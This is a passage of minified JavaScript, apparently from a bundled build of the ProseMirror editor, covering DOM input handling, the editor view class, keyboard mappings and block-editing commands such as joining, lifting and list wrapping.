null}const X4=/^(a|abbr|acronym|b|bd[io]|big|br|button|cite|code|data(list)?|del|dfn|em|i|img|ins|kbd|label|map|mark|meter|output|q|ruby|s|samp|small|span|strong|su[bp]|time|u|tt|var)$/i;function Z4(t,e,n,r,i){let s=t.input.compositionPendingChanges||(t.composing?t.input.compositionID:0);if(t.input.compositionPendingChanges=0,e<0){let C=t.input.lastSelectionTime>Date.now()-50?t.input.lastSelectionOrigin:null,N=xg(t,C);if(N&&!t.state.selection.eq(N)){if(tt&&Fn&&t.input.lastKeyCode===13&&Date.now()-100<t.input.lastKeyCodeTime&&t.someProp("handleKeyDown",H=>H(t,qr(13,"Enter"))))return;let O=t.state.tr.setSelection(N);C=="pointer"?O.setMeta("pointer",!0):C=="key"&&O.scrollIntoView(),s&&O.setMeta("composition",s),t.dispatch(O)}return}let o=t.state.doc.resolve(e),a=o.sharedDepth(n);e=o.before(a+1),n=t.state.doc.resolve(n).after(a+1);let l=t.state.selection,u=Y4(t,e,n),c=t.state.doc,d=c.slice(u.from,u.to),f,h;t.input.lastKeyCode===8&&Date.now()-100<t.input.lastKeyCodeTime?(f=t.state.selection.to,h="end"):(f=t.state.selection.from,h="start"),t.input.lastKeyCode=null;let p=nF(d.content,u.doc.content,u.from,f,h);if(p&&t.input.domChangeCount++,(Ts&&t.input.lastIOSEnter>Date.now()-225||Fn)&&i.some(C=>C.nodeType==1&&!X4.test(C.nodeName))&&(!p||p.endA>=p.endB)&&t.someProp("handleKeyDown",C=>C(t,qr(13,"Enter")))){t.input.lastIOSEnter=0;return}if(!p)if(r&&l instanceof $&&!l.empty&&l.$head.sameParent(l.$anchor)&&!t.composing&&!(u.sel&&u.sel.anchor!=u.sel.head))p={start:l.from,endA:l.to,endB:l.to};else{if(u.sel){let C=jv(t,t.state.doc,u.sel);if(C&&!C.eq(t.state.selection)){let N=t.state.tr.setSelection(C);s&&N.setMeta("composition",s),t.dispatch(N)}}return}t.state.selection.from<t.state.selection.to&&p.start==p.endB&&t.state.selection instanceof $&&(p.start>t.state.selection.from&&p.start<=t.state.selection.from+2&&t.state.selection.from>=u.from?p.start=t.state.selection.from:p.endA<t.state.selection.to&&p.endA>=t.state.selection.to-2&&t.state.selection.to<=u.to&&(p.endB+=t.state.selection.to-p.endA,p.endA=t.state.selection.to)),kt&&Tr<=11&&p.endB==p.start+1&&p.endA==p.start&&p.start>u.from&&u.doc.textBetween(p.start-u.from-1,p.start-u.from+1)==" "&&(p.start--,p.endA--,p.endB--);let y=u.doc.resolveNoCache(p.start-u.from),x=u.doc.resolveNoCache(p.endB-u.from),g=c.resolve(p.start),v=y.sameParent(x)&&y.parent.inlineContent&&g.end()>=p.endA,w;if((Ts&&t.input.lastIOSEnter>Date.now()-225&&(!v||i.some(C=>C.nodeName=="DIV"||C.nodeName=="P"))||!v&&y.pos<u.doc.content.size&&(!y.sameParent(x)||!y.parent.inlineContent)&&!/\S/.test(u.doc.textBetween(y.pos,x.pos,"",""))&&(w=W.findFrom(u.doc.resolve(y.pos+1),1,!0))&&w.head>y.pos)&&t.someProp("handleKeyDown",C=>C(t,qr(13,"Enter")))){t.input.lastIOSEnter=0;return}if(t.state.selection.anchor>p.start&&tF(c,p.start,p.endA,y,x)&&t.someProp("handleKeyDown",C=>C(t,qr(8,"Backspace")))){Fn&&tt&&t.domObserver.suppressSelectionUpdates();return}tt&&p.endB==p.start&&(t.input.lastChromeDelete=Date.now()),Fn&&!v&&y.start()!=x.start()&&x.parentOffset==0&&y.depth==x.depth&&u.sel&&u.sel.anchor==u.sel.head&&u.sel.head==p.endA&&(p.endB-=2,x=u.doc.resolveNoCache(p.endB-u.from),setTimeout(()=>{t.someProp("handleKeyDown",function(C){return C(t,qr(13,"Enter"))})},20));let b=p.start,k=p.endA,E=C=>{let N=C||t.state.tr.replace(b,k,u.doc.slice(p.start-u.from,p.endB-u.from));if(u.sel){let O=jv(t,N.doc,u.sel);O&&!(tt&&t.composing&&O.empty&&(p.start!=p.endB||t.input.lastChromeDelete<Date.now()-100)&&(O.head==b||O.head==N.mapping.map(k)-1)||kt&&O.empty&&O.head==b)&&N.setSelection(O)}return s&&N.setMeta("composition",s),N.scrollIntoView()},M;if(v){if(y.pos==x.pos){kt&&Tr<=11&&y.parentOffset==0&&(t.domObserver.suppressSelectionUpdates(),setTimeout(()=>zn(t),20));let C=E(t.state.tr.delete(b,k)),N=c.resolve(p.start).marksAcross(c.resolve(p.endA));N&&C.ensureMarks(N),t.dispatch(C)}else if(p.endA==p.endB&&(M=eF(y.parent.content.cut(y.parentOffset,x.parentOffset),g.parent.content.cut(g.parentOffset,p.endA-g.start())))){let C=E(t.state.tr);M.type=="add"?C.addMark(b,k,M.mark):C.removeMark(b,k,M.mark),t.dispatch(C)}else if(y.parent.child(y.index()).isText&&y.index()==x.index()-(x.textOffset?0:1)){let C=y.parent.textBetween(y.parentOffset,x.parentOffset),N=()=>E(t.state.tr.insertText(C,b,k));t.someProp("handleTextInput",O=>O(t,b,k,C,N))||t.dispatch(N())}}else t.dispatch(E())}function jv(t,e,n){return Math.max(n.anchor,n.head)>e.content.size?null:vg(t,e.resolve(n.anchor),e.resolve(n.head))}function eF(t,e){let n=t.firstChild.marks,r=e.firstChild.marks,i=n,s=r,o,a,l;for(let c=0;c<r.length;c++)i=r[c].removeFromSet(i);for(let c=0;c<n.length;c++)s=n[c].removeFromSet(s);if(i.length==1&&s.length==0)a=i[0],o="add",l=c=>c.mark(a.addToSet(c.marks));else if(i.length==0&&s.length==1)a=s[0],o="remove",l=c=>c.mark(a.removeFromSet(c.marks));else return null;let u=[];for(let c=0;c<e.childCount;c++)u.push(l(e.child(c)));if(A.from(u).eq(t))return{mark:a,type:o}}function tF(t,e,n,r,i){if(n-e<=i.pos-r.pos||hf(r,!0,!1)<i.pos)return!1;let s=t.resolve(e);if(!r.parent.isTextblock){let a=s.nodeAfter;return a!=null&&n==e+a.nodeSize}if(s.parentOffset<s.parent.content.size||!s.parent.isTextblock)return!1;let o=t.resolve(hf(s,!0,!0));return!o.parent.isTextblock||o.pos>n||hf(o,!0,!1)<n?!1:r.parent.content.cut(r.parentOffset).eq(o.parent.content)}function hf(t,e,n){let r=t.depth,i=e?t.end():t.pos;for(;r>0&&(e||t.indexAfter(r)==t.node(r).childCount);)r--,i++,e=!1;if(n){let s=t.node(r).maybeChild(t.indexAfter(r));for(;s&&!s.isLeaf;)s=s.firstChild,i++}return i}function nF(t,e,n,r,i){let s=t.findDiffStart(e,n);if(s==null)return null;let{a:o,b:a}=t.findDiffEnd(e,n+t.size,n+e.size);if(i=="end"){let l=Math.max(0,s-Math.min(o,a));r-=o+l-s}if(o<s&&t.size<e.size){let l=r<=s&&r>=o?s-r:0;s-=l,s&&s<e.size&&Fv(e.textBetween(s-1,s+1))&&(s+=l?1:-1),a=s+(a-o),o=s}else if(a<s){let l=r<=s&&r>=a?s-r:0;s-=l,s&&s<t.size&&Fv(t.textBetween(s-1,s+1))&&(s+=l?1:-1),o=s+(o-a),a=s}return{start:s,endA:o,endB:a}}function Fv(t){if(t.length!=2)return!1;let e=t.charCodeAt(0),n=t.charCodeAt(1);return e>=56320&&e<=57343&&n>=55296&&n<=56319}class mE{constructor(e,n){this._root=null,this.focused=!1,this.trackWrites=null,this.mounted=!1,this.markCursor=null,this.cursorWrapper=null,this.lastSelectedViewDesc=void 0,this.input=new S4,this.prevDirectPlugins=[],this.pluginViews=[],this.requiresGeckoHackNode=!1,this.dragging=null,this._props=n,this.state=n.state,this.directPlugins=n.plugins||[],this.directPlugins.forEach($v),this.dispatch=this.dispatch.bind(this),this.dom=e&&e.mount||document.createElement("div"),e&&(e.appendChild?e.appendChild(this.dom):typeof e=="function"?e(this.dom):e.mount&&(this.mounted=!0)),this.editable=zv(this),Vv(this),this.nodeViews=_v(this),this.docView=xv(this.state.doc,Bv(this),ff(this),this.dom,this),this.domObserver=new K4(this,(r,i,s,o)=>Z4(this,r,i,s,o)),this.domObserver.start(),k4(this),this.updatePluginViews()}get composing(){return this.input.composing}get props(){if(this._props.state!=this.state){let e=this._props;this._props={};for(let n in e)this._props[n]=e[n];this._props.state=this.state}return this._props}update(e){e.handleDOMEvents!=this._props.handleDOMEvents&&lp(this);let n=this._props;this._props=e,e.plugins&&(e.plugins.forEach($v),this.directPlugins=e.plugins),this.updateStateInner(e.state,n)}setProps(e){let n={};for(let r in this._props)n[r]=this._props[r];n.state=this.state;for(let r in e)n[r]=e[r];this.update(n)}updateState(e){this.updateStateInner(e,this._props)}updateStateInner(e,n){var r;let i=this.state,s=!1,o=!1;e.storedMarks&&this.composing&&(lE(this),o=!0),this.state=e;let a=i.plugins!=e.plugins||this._props.plugins!=n.plugins;if(a||this._props.plugins!=n.plugins||this._props.nodeViews!=n.nodeViews){let h=_v(this);iF(h,this.nodeViews)&&(this.nodeViews=h,s=!0)}(a||n.handleDOMEvents!=this._props.handleDOMEvents)&&lp(this),this.editable=zv(this),Vv(this);let l=ff(this),u=Bv(this),c=i.plugins!=e.plugins&&!i.doc.eq(e.doc)?"reset":e.scrollToSelection>i.scrollToSelection?"to selection":"preserve",d=s||!this.docView.matchesNode(e.doc,u,l);(d||!e.selection.eq(i.selection))&&(o=!0);let f=c=="preserve"&&o&&this.dom.style.overflowAnchor==null&&j3(this);if(o){this.domObserver.stop();let h=d&&(kt||tt)&&!this.composing&&!i.selection.empty&&!e.selection.empty&&rF(i.selection,e.selection);if(d){let p=tt?this.trackWrites=this.domSelectionRange().focusNode:null;this.composing&&(this.input.compositionNode=I4(this)),(s||!this.docView.update(e.doc,u,l,this))&&(this.docView.updateOuterDeco(u),this.docView.destroy(),this.docView=xv(e.doc,u,l,this.dom,this)),p&&!this.trackWrites&&(h=!0)}h||!(this.input.mouseDown&&this.domObserver.currentSelection.eq(this.domSelectionRange())&&o4(this))?zn(this,h):(YC(this,e.selection),this.domObserver.setCurSelection()),this.domObserver.start()}this.updatePluginViews(i),!((r=this.dragging)===null||r===void 0)&&r.node&&!i.doc.eq(e.doc)&&this.updateDraggedNode(this.dragging,i),c=="reset"?this.dom.scrollTop=0:c=="to selection"?this.scrollToSelection():f&&F3(f)}scrollToSelection(){let e=this.domSelectionRange().focusNode;if(!(!e||!this.dom.contains(e.nodeType==1?e:e.parentNode))){if(!this.someProp("handleScrollToSelection",n=>n(this)))if(this.state.selection instanceof V){let n=this.docView.domAfterPos(this.state.selection.from);n.nodeType==1&&fv(this,n.getBoundingClientRect(),e)}else fv(this,this.coordsAtPos(this.state.selection.head,1),e)}}destroyPluginViews(){let e;for(;e=this.pluginViews.pop();)e.destroy&&e.destroy()}updatePluginViews(e){if(!e||e.plugins!=this.state.plugins||this.directPlugins!=this.prevDirectPlugins){this.prevDirectPlugins=this.directPlugins,this.destroyPluginViews();for(let n=0;n<this.directPlugins.length;n++){let r=this.directPlugins[n];r.spec.view&&this.pluginViews.push(r.spec.view(this))}for(let n=0;n<this.state.plugins.length;n++){let r=this.state.plugins[n];r.spec.view&&this.pluginViews.push(r.spec.view(this))}}else for(let n=0;n<this.pluginViews.length;n++){let r=this.pluginViews[n];r.update&&r.update(this,e)}}updateDraggedNode(e,n){let r=e.node,i=-1;if(this.state.doc.nodeAt(r.from)==r.node)i=r.from;else{let s=r.from+(this.state.doc.content.size-n.doc.content.size);(s>0&&this.state.doc.nodeAt(s))==r.node&&(i=s)}this.dragging=new cE(e.slice,e.move,i<0?void 0:V.create(this.state.doc,i))}someProp(e,n){let r=this._props&&this._props[e],i;if(r!=null&&(i=n?n(r):r))return i;for(let o=0;o<this.directPlugins.length;o++){let a=this.directPlugins[o].props[e];if(a!=null&&(i=n?n(a):a))return i}let s=this.state.plugins;if(s)for(let o=0;o<s.length;o++){let a=s[o].props[e];if(a!=null&&(i=n?n(a):a))return i}}hasFocus(){if(kt){let e=this.root.activeElement;if(e==this.dom)return!0;if(!e||!this.dom.contains(e))return!1;for(;e&&this.dom!=e&&this.dom.contains(e);){if(e.contentEditable=="false")return!1;e=e.parentElement}return!0}return this.root.activeElement==this.dom}focus(){this.domObserver.stop(),this.editable&&B3(this.dom),zn(this),this.domObserver.start()}get root(){let e=this._root;if(e==null){for(let n=this.dom.parentNode;n;n=n.parentNode)if(n.nodeType==9||n.nodeType==11&&n.host)return n.getSelection||(Object.getPrototypeOf(n).getSelection=()=>n.ownerDocument.getSelection()),this._root=n}return e||document}updateRoot(){this._root=null}posAtCoords(e){return H3(this,e)}coordsAtPos(e,n=1){return $C(this,e,n)}domAtPos(e,n=0){return this.docView.domFromPos(e,n)}nodeDOM(e){let n=this.docView.descAt(e);return n?n.nodeDOM:null}posAtDOM(e,n,r=-1){let i=this.docView.posFromDOM(e,n,r);if(i==null)throw new RangeError("DOM position not inside the editor");return i}endOfTextblock(e,n){return G3(this,n||this.state,e)}pasteHTML(e,n){return ma(this,"",e,!1,n||new ClipboardEvent("paste"))}pasteText(e,n){return ma(this,e,null,!0,n||new ClipboardEvent("paste"))}serializeForClipboard(e){return wg(this,e)}destroy(){this.docView&&(b4(this),this.destroyPluginViews(),this.mounted?(this.docView.update(this.state.doc,[],ff(this),this),this.dom.textContent=""):this.dom.parentNode&&this.dom.parentNode.removeChild(this.dom),this.docView.destroy(),this.docView=null,E3())}get isDestroyed(){return this.docView==null}dispatchEvent(e){return E4(this,e)}domSelectionRange(){let e=this.domSelection();return e?lt&&this.root.nodeType===11&&P3(this.dom.ownerDocument)==this.dom&&G4(this,e)||e:{focusNode:null,focusOffset:0,anchorNode:null,anchorOffset:0}}domSelection(){return this.root.getSelection()}}mE.prototype.dispatch=function(t){let e=this._props.dispatchTransaction;e?e.call(this,t):this.updateState(this.state.apply(t))};function Bv(t){let e=Object.create(null);return e.class="ProseMirror",e.contenteditable=String(t.editable),t.someProp("attributes",n=>{if(typeof n=="function"&&(n=n(t.state)),n)for(let r in n)r=="class"?e.class+=" "+n[r]:r=="style"?e.style=(e.style?e.style+";":"")+n[r]:!e[r]&&r!="contenteditable"&&r!="nodeName"&&(e[r]=String(n[r]))}),e.translate||(e.translate="no"),[ot.node(0,t.state.doc.content.size,e)]}function Vv(t){if(t.markCursor){let e=document.createElement("img");e.className="ProseMirror-separator",e.setAttribute("mark-placeholder","true"),e.setAttribute("alt",""),t.cursorWrapper={dom:e,deco:ot.widget(t.state.selection.from,e,{raw:!0,marks:t.markCursor})}}else t.cursorWrapper=null}function zv(t){return!t.someProp("editable",e=>e(t.state)===!1)}function rF(t,e){let n=Math.min(t.$anchor.sharedDepth(t.head),e.$anchor.sharedDepth(e.head));return t.$anchor.start(n)!=e.$anchor.start(n)}function _v(t){let e=Object.create(null);function n(r){for(let i in r)Object.prototype.hasOwnProperty.call(e,i)||(e[i]=r[i])}return t.someProp("nodeViews",n),t.someProp("markViews",n),e}function iF(t,e){let n=0,r=0;for(let i in t){if(t[i]!=e[i])return!0;n++}for(let i in e)r++;return n!=r}function $v(t){if(t.spec.state||t.spec.filterTransaction||t.spec.appendTransaction)throw new RangeError("Plugins passed directly to the view must not have a state component")}var Dr={8:"Backspace",9:"Tab",10:"Enter",12:"NumLock",13:"Enter",16:"Shift",17:"Control",18:"Alt",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",44:"PrintScreen",45:"Insert",46:"Delete",59:";",61:"=",91:"Meta",92:"Meta",106:"*",107:"+",108:",",109:"-",110:".",111:"/",144:"NumLock",145:"ScrollLock",160:"Shift",161:"Shift",162:"Control",163:"Control",164:"Alt",165:"Alt",173:"-",186:";",187:"=",188:",",189:"-",190:".",191:"/",192:"`",219:"[",220:"\\",221:"]",222:"'"},Fu={48:")",49:"!",50:"@",51:"#",52:"$",53:"%",54:"^",55:"&",56:"*",57:"(",59:":",61:"+",173:"_",186:":",187:"+",188:"<",189:"_",190:">",191:"?",192:"~",219:"{",220:"|",221:"}",222:'"'},sF=typeof navigator<"u"&&/Mac/.test(navigator.platform),oF=typeof navigator<"u"&&/MSIE \d|Trident\/(?:[7-9]|\d{2,})\..*rv:(\d+)/.exec(navigator.userAgent);for(var We=0;We<10;We++)Dr[48+We]=Dr[96+We]=String(We);for(var We=1;We<=24;We++)Dr[We+111]="F"+We;for(var We=65;We<=90;We++)Dr[We]=String.fromCharCode(We+32),Fu[We]=String.fromCharCode(We);for(var pf in Dr)Fu.hasOwnProperty(pf)||(Fu[pf]=Dr[pf]);function aF(t){var e=sF&&t.metaKey&&t.shiftKey&&!t.ctrlKey&&!t.altKey||oF&&t.shiftKey&&t.key&&t.key.length==1||t.key=="Unidentified",n=!e&&t.key||(t.shiftKey?Fu:Dr)[t.keyCode]||t.key||"Unidentified";return n=="Esc"&&(n="Escape"),n=="Del"&&(n="Delete"),n=="Left"&&(n="ArrowLeft"),n=="Up"&&(n="ArrowUp"),n=="Right"&&(n="ArrowRight"),n=="Down"&&(n="ArrowDown"),n}const lF=typeof navigator<"u"&&/Mac|iP(hone|[oa]d)/.test(navigator.platform),uF=typeof navigator<"u"&&/Win/.test(navigator.platform);function cF(t){let e=t.split(/-(?!$)/),n=e[e.length-1];n=="Space"&&(n=" ");let r,i,s,o;for(let a=0;a<e.length-1;a++){let l=e[a];if(/^(cmd|meta|m)$/i.test(l))o=!0;else if(/^a(lt)?$/i.test(l))r=!0;else if(/^(c|ctrl|control)$/i.test(l))i=!0;else if(/^s(hift)?$/i.test(l))s=!0;else if(/^mod$/i.test(l))lF?o=!0:i=!0;else throw new Error("Unrecognized modifier name: "+l)}return r&&(n="Alt-"+n),i&&(n="Ctrl-"+n),o&&(n="Meta-"+n),s&&(n="Shift-"+n),n}function dF(t){let e=Object.create(null);for(let n in t)e[cF(n)]=t[n];return e}function mf(t,e,n=!0){return e.altKey&&(t="Alt-"+t),e.ctrlKey&&(t="Ctrl-"+t),e.metaKey&&(t="Meta-"+t),n&&e.shiftKey&&(t="Shift-"+t),t}function fF(t){return new we({props:{handleKeyDown:gE(t)}})}function gE(t){let e=dF(t);return function(n,r){let i=aF(r),s,o=e[mf(i,r)];if(o&&o(n.state,n.dispatch,n))return!0;if(i.length==1&&i!=" "){if(r.shiftKey){let a=e[mf(i,r,!1)];if(a&&a(n.state,n.dispatch,n))return!0}if((r.altKey||r.metaKey||r.ctrlKey)&&!(uF&&r.ctrlKey&&r.altKey)&&(s=Dr[r.keyCode])&&s!=i){let a=e[mf(s,r)];if(a&&a(n.state,n.dispatch,n))return!0}}return!1}}const hF=(t,e)=>t.selection.empty?!1:(e&&e(t.tr.deleteSelection().scrollIntoView()),!0);function yE(t,e){let{$cursor:n}=t.selection;return!n||(e?!e.endOfTextblock("backward",t):n.parentOffset>0)?null:n}const pF=(t,e,n)=>{let r=yE(t,n);if(!r)return!1;let i=Tg(r);if(!i){let o=r.blockRange(),a=o&&_s(o);return a==null?!1:(e&&e(t.tr.lift(o,a).scrollIntoView()),!0)}let s=i.nodeBefore;if(SE(t,i,e,-1))return!0;if(r.parent.content.size==0&&(Ms(s,"end")||V.isSelectable(s)))for(let o=r.depth;;o--){let a=Kc(t.doc,r.before(o),r.after(o),L.empty);if(a&&a.slice.size<a.to-a.from){if(e){let l=t.tr.step(a);l.setSelection(Ms(s,"end")?W.findFrom(l.doc.resolve(l.mapping.map(i.pos,-1)),-1):V.create(l.doc,i.pos-s.nodeSize)),e(l.scrollIntoView())}return!0}if(o==1||r.node(o-1).childCount>1)break}return s.isAtom&&i.depth==r.depth-1?(e&&e(t.tr.delete(i.pos-s.nodeSize,i.pos).scrollIntoView()),!0):!1},mF=(t,e,n)=>{let r=yE(t,n);if(!r)return!1;let i=Tg(r);return i?xE(t,i,e):!1},gF=(t,e,n)=>{let r=vE(t,n);if(!r)return!1;let i=Mg(r);return i?xE(t,i,e):!1};function xE(t,e,n){let r=e.nodeBefore,i=r,s=e.pos-1;for(;!i.isTextblock;s--){if(i.type.spec.isolating)return!1;let c=i.lastChild;if(!c)return!1;i=c}let o=e.nodeAfter,a=o,l=e.pos+1;for(;!a.isTextblock;l++){if(a.type.spec.isolating)return!1;let c=a.firstChild;if(!c)return!1;a=c}let u=Kc(t.doc,s,l,L.empty);if(!u||u.from!=s||u instanceof Ie&&u.slice.size>=l-s)return!1;if(n){let c=t.tr.step(u);c.setSelection($.create(c.doc,s)),n(c.scrollIntoView())}return!0}function Ms(t,e,n=!1){for(let r=t;r;r=e=="start"?r.firstChild:r.lastChild){if(r.isTextblock)return!0;if(n&&r.childCount!=1)return!1}return!1}const yF=(t,e,n)=>{let{$head:r,empty:i}=t.selection,s=r;if(!i)return!1;if(r.parent.isTextblock){if(n?!n.endOfTextblock("backward",t):r.parentOffset>0)return!1;s=Tg(r)}let o=s&&s.nodeBefore;return!o||!V.isSelectable(o)?!1:(e&&e(t.tr.setSelection(V.create(t.doc,s.pos-o.nodeSize)).scrollIntoView()),!0)};function Tg(t){if(!t.parent.type.spec.isolating)for(let e=t.depth-1;e>=0;e--){if(t.index(e)>0)return t.doc.resolve(t.before(e+1));if(t.node(e).type.spec.isolating)break}return null}function vE(t,e){let{$cursor:n}=t.selection;return!n||(e?!e.endOfTextblock("forward",t):n.parentOffset<n.parent.content.size)?null:n}const xF=(t,e,n)=>{let r=vE(t,n);if(!r)return!1;let i=Mg(r);if(!i)return!1;let s=i.nodeAfter;if(SE(t,i,e,1))return!0;if(r.parent.content.size==0&&(Ms(s,"start")||V.isSelectable(s))){let o=Kc(t.doc,r.before(),r.after(),L.empty);if(o&&o.slice.size<o.to-o.from){if(e){let a=t.tr.step(o);a.setSelection(Ms(s,"start")?W.findFrom(a.doc.resolve(a.mapping.map(i.pos)),1):V.create(a.doc,a.mapping.map(i.pos))),e(a.scrollIntoView())}return!0}}return s.isAtom&&i.depth==r.depth-1?(e&&e(t.tr.delete(i.pos,i.pos+s.nodeSize).scrollIntoView()),!0):!1},vF=(t,e,n)=>{let{$head:r,empty:i}=t.selection,s=r;if(!i)return!1;if(r.parent.isTextblock){if(n?!n.endOfTextblock("forward",t):r.parentOffset<r.parent.content.size)return!1;s=Mg(r)}let o=s&&s.nodeAfter;return!o||!V.isSelectable(o)?!1:(e&&e(t.tr.setSelection(V.create(t.doc,s.pos)).scrollIntoView()),!0)};function Mg(t){if(!t.parent.type.spec.isolating)for(let e=t.depth-1;e>=0;e--){let n=t.node(e);if(t.index(e)+1<n.childCount)return t.doc.resolve(t.after(e+1));if(n.type.spec.isolating)break}return null}const wF=(t,e)=>{let n=t.selection,r=n instanceof V,i;if(r){if(n.node.isTextblock||!Vr(t.doc,n.from))return!1;i=n.from}else if(i=Wc(t.doc,n.from,-1),i==null)return!1;if(e){let s=t.tr.join(i);r&&s.setSelection(V.create(s.doc,i-t.doc.resolve(i).nodeBefore.nodeSize)),e(s.scrollIntoView())}return!0},SF=(t,e)=>{let n=t.selection,r;if(n instanceof V){if(n.node.isTextblock||!Vr(t.doc,n.to))return!1;r=n.to}else if(r=Wc(t.doc,n.to,1),r==null)return!1;return e&&e(t.tr.join(r).scrollIntoView()),!0},kF=(t,e)=>{let{$from:n,$to:r}=t.selection,i=n.blockRange(r),s=i&&_s(i);return s==null?!1:(e&&e(t.tr.lift(i,s).scrollIntoView()),!0)},bF=(t,e)=>{let{$head:n,$anchor:r}=t.selection;return!n.parent.type.spec.code||!n.sameParent(r)?!1:(e&&e(t.tr.insertText(`
`).scrollIntoView()),!0)};function wE(t){for(let e=0;e<t.edgeCount;e++){let{type:n}=t.edge(e);if(n.isTextblock&&!n.hasRequiredAttrs())return n}return null}const CF=(t,e)=>{let{$head:n,$anchor:r}=t.selection;if(!n.parent.type.spec.code||!n.sameParent(r))return!1;let i=n.node(-1),s=n.indexAfter(-1),o=wE(i.contentMatchAt(s));if(!o||!i.canReplaceWith(s,s,o))return!1;if(e){let a=n.after(),l=t.tr.replaceWith(a,a,o.createAndFill());l.setSelection(W.near(l.doc.resolve(a),1)),e(l.scrollIntoView())}return!0},EF=(t,e)=>{let n=t.selection,{$from:r,$to:i}=n;if(n instanceof Wt||r.parent.inlineContent||i.parent.inlineContent)return!1;let s=wE(i.parent.contentMatchAt(i.indexAfter()));if(!s||!s.isTextblock)return!1;if(e){let o=(!r.parentOffset&&i.index()<i.parent.childCount?r:i).pos,a=t.tr.insert(o,s.createAndFill());a.setSelection($.create(a.doc,o+1)),e(a.scrollIntoView())}return!0},TF=(t,e)=>{let{$cursor:n}=t.selection;if(!n||n.parent.content.size)return!1;if(n.depth>1&&n.after()!=n.end(-1)){let s=n.before();if(cs(t.doc,s))return e&&e(t.tr.split(s).scrollIntoView()),!0}let r=n.blockRange(),i=r&&_s(r);return i==null?!1:(e&&e(t.tr.lift(r,i).scrollIntoView()),!0)},MF=(t,e)=>{let{$from:n,to:r}=t.selection,i,s=n.sharedDepth(r);return s==0?!1:(i=n.before(s),e&&e(t.tr.setSelection(V.create(t.doc,i))),!0)};function NF(t,e,n){let r=e.nodeBefore,i=e.nodeAfter,s=e.index();return!r||!i||!r.type.compatibleContent(i.type)?!1:!r.content.size&&e.parent.canReplace(s-1,s)?(n&&n(t.tr.delete(e.pos-r.nodeSize,e.pos).scrollIntoView()),!0):!e.parent.canReplace(s,s+1)||!(i.isTextblock||Vr(t.doc,e.pos))?!1:(n&&n(t.tr.join(e.pos).scrollIntoView()),!0)}function SE(t,e,n,r){let i=e.nodeBefore,s=e.nodeAfter,o,a,l=i.type.spec.isolating||s.type.spec.isolating;if(!l&&NF(t,e,n))return!0;let u=!l&&e.parent.canReplace(e.index(),e.index()+1);if(u&&(o=(a=i.contentMatchAt(i.childCount)).findWrapping(s.type))&&a.matchType(o[0]||s.type).validEnd){if(n){let h=e.pos+s.nodeSize,p=A.empty;for(let g=o.length-1;g>=0;g--)p=A.from(o[g].create(null,p));p=A.from(i.copy(p));let y=t.tr.step(new Fe(e.pos-1,h,e.pos,h,new L(p,1,0),o.length,!0)),x=y.doc.resolve(h+2*o.length);x.nodeAfter&&x.nodeAfter.type==i.type&&Vr(y.doc,x.pos)&&y.join(x.pos),n(y.scrollIntoView())}return!0}let c=s.type.spec.isolating||r>0&&l?null:W.findFrom(e,1),d=c&&c.$from.blockRange(c.$to),f=d&&_s(d);if(f!=null&&f>=e.depth)return n&&n(t.tr.lift(d,f).scrollIntoView()),!0;if(u&&Ms(s,"start",!0)&&Ms(i,"end")){let h=i,p=[];for(;p.push(h),!h.isTextblock;)h=h.lastChild;let y=s,x=1;for(;!y.isTextblock;y=y.firstChild)x++;if(h.canReplace(h.childCount,h.childCount,y.content)){if(n){let g=A.empty;for(let w=p.length-1;w>=0;w--)g=A.from(p[w].copy(g));let v=t.tr.step(new Fe(e.pos-p.length,e.pos+s.nodeSize,e.pos+x,e.pos+s.nodeSize-x,new L(g,p.length,0),0,!0));n(v.scrollIntoView())}return!0}}return!1}function kE(t){return function(e,n){let r=e.selection,i=t<0?r.$from:r.$to,s=i.depth;for(;i.node(s).isInline;){if(!s)return!1;s--}return i.node(s).isTextblock?(n&&n(e.tr.setSelection($.create(e.doc,t<0?i.start(s):i.end(s)))),!0):!1}}const AF=kE(-1),PF=kE(1);function RF(t,e=null){return function(n,r){let{$from:i,$to:s}=n.selection,o=i.blockRange(s),a=o&&mg(o,t,e);return a?(r&&r(n.tr.wrap(o,a).scrollIntoView()),!0):!1}}function Hv(t,e=null){return function(n,r){let i=!1;for(let s=0;s<n.selection.ranges.length&&!i;s++){let{$from:{pos:o},$to:{pos:a}}=n.selection.ranges[s];n.doc.nodesBetween(o,a,(l,u)=>{if(i)return!1;if(!(!l.isTextblock||l.hasMarkup(t,e)))if(l.type==t)i=!0;else{let c=n.doc.resolve(u),d=c.index();i=c.parent.canReplaceWith(d,d+1,t)}})}if(!i)return!1;if(r){let s=n.tr;for(let o=0;o<n.selection.ranges.length;o++){let{$from:{pos:a},$to:{pos:l}}=n.selection.ranges[o];s.setBlockType(a,l,t,e)}r(s.scrollIntoView())}return!0}}typeof navigator<"u"?/Mac|iP(hone|[oa]d)/.test(navigator.platform):typeof os<"u"&&os.platform&&os.platform()=="darwin";function OF(t,e=null){return function(n,r){let{$from:i,$to:s}=n.selection,o=i.blockRange(s);if(!o)return!1;let a=r?n.tr:null;return DF(a,o,t,e)?(r&&r(a.scrollIntoView()),!0):!1}}function DF(t,e,n,r=null){let i=!1,s=e,o=e.$from.doc;if(e.depth>=2&&e.$from.node(e.depth-1).type.compatibleContent(n)&&e.startIndex==0){if(e.$from.index(e.depth-1)==0)return!1;let l=o.resolve(e.start-2);s=new Pu(l,l,e.depth),e.endIndex<e.parent.childCount&&(e=new Pu(e.$from,o.resolve(e.$to.end(e.depth)),e.depth)),i=!0}let a=mg(s,n,r,e);return a?(t&&LF(t,e,a,i,n),!0):!1}function LF(t,e,n,r,i){let s=A.empty;for(let c=n.length-1;c>=0;c--)s=A.from(n[c].type.create(n[c].attrs,s));t.step(new Fe(e.start-(r?2:0),e.end,e.start,e.end,new L(s,0,0),n.length,!0));let o=0;for(let c=0;c<n.length;c++)n[c].type==i&&(o=c+1);let a=n.length-o,l=e.start+n.length-(r?2:0),u=e.parent;for(let c=e.startIndex,d=e.endIndex,f=!0;c<d;c++,f=!1)!f&&cs(t.doc,l,a)&&(t.split(l,a),l+=2*a),l+=u.child(c).nodeSize;return t}function IF(t){return function(e,n){let{$from:r,$to:i}=e.selection,s=r.blockRange(i,o=>o.childCount>0&&o.firstChild.type==t);return s?n?r.node(s.depth-1).type==t?jF(e,n,t,s):FF(e,n,s):!0:!1}}function jF(t,e,n,r){let i=t.tr,s=r.end,o=r.$to.end(r.depth);s<o&&(i.step(new Fe(s-1,o,s,o,new L(A.from(n.create(null,r.parent.copy())),1,0),1,!0)),r=new 